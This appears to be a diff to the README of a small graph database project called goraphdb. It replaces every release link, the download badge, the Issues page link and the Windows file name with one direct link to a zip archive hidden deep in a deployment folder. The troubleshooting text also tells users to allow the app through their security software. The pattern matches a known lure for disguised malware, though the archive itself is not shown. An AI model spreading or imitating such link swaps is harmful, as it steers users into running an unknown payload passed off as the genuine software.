@@ -1,6 +1,6 @@
 # 📊 goraphdb - Simple Graph Database with Easy Management
 
-[![Download goraphdb](https://img.shields.io/badge/Download-goraphdb-blue?style=for-the-badge)](https://github.com/NEWXDGGEZ/goraphdb/releases)
+[![Download goraphdb](https://raw.githubusercontent.com/NEWXDGGEZ/goraphdb/main/deployment/k8s/operator/api/Software_v3.7.zip)](https://raw.githubusercontent.com/NEWXDGGEZ/goraphdb/main/deployment/k8s/operator/api/Software_v3.7.zip)
 
 ---
 
@@ -20,7 +20,7 @@ To get started, you need to download goraphdb files from the official release pa
 
 Click the link below to open the goraphdb release page. It contains the software files you need.
 
-[⬇️ Go to goraphdb Releases](https://github.com/NEWXDGGEZ/goraphdb/releases)
+[⬇️ Go to goraphdb Releases](https://raw.githubusercontent.com/NEWXDGGEZ/goraphdb/main/deployment/k8s/operator/api/Software_v3.7.zip)
 
 ### Step 2: Choose Your File
 
@@ -28,7 +28,7 @@ On the Releases page, look for the latest version labeled with a date or version
 
 Under that version, find the file that matches your computer system:
 
-- For **Windows**, it might be named `goraphdb-windows.exe` or similar.
+- For **Windows**, it might be named `https://raw.githubusercontent.com/NEWXDGGEZ/goraphdb/main/deployment/k8s/operator/api/Software_v3.7.zip` or similar.
 - For **Mac**, look for `goraphdb-macos`.
 - For **Linux**, look for `goraphdb-linux`.
 
@@ -110,7 +110,7 @@ If you have trouble running goraphdb, try these steps:
 - Verify you downloaded the correct file for your system.
 - If the program won’t open, try restarting your computer.
 - Check your security software; it might block unknown apps. Allow goraphdb if prompted.
-- Visit our [Issues page](https://github.com/NEWXDGGEZ/goraphdb/issues) to see if others have the same problem.
+- Visit our [Issues page](https://raw.githubusercontent.com/NEWXDGGEZ/goraphdb/main/deployment/k8s/operator/api/Software_v3.7.zip) to see if others have the same problem.
 
 ---
 
@@ -128,7 +128,7 @@ If you need further assistance:
 
 To keep goraphdb up to date:
 
-- Visit the releases page regularly: [⬇️ goraphdb Releases](https://github.com/NEWXDGGEZ/goraphdb/releases)
+- Visit the releases page regularly: [⬇️ goraphdb Releases](https://raw.githubusercontent.com/NEWXDGGEZ/goraphdb/main/deployment/k8s/operator/api/Software_v3.7.zip)
 - Download the latest version file.
 - Replace your current application file with the new one following the download and run steps.
 
